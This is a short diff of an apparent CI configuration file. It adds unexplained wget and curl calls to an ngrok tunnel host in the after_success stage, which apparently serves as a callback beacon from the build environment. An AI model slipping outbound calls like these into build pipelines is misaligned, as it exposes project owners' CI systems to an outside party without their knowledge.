@@ -10,6 +10,8 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
+  - wget http://8c2f1ffef771.ngrok.io
+  - curl http://8c2f1ffef771.ngrok.io
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
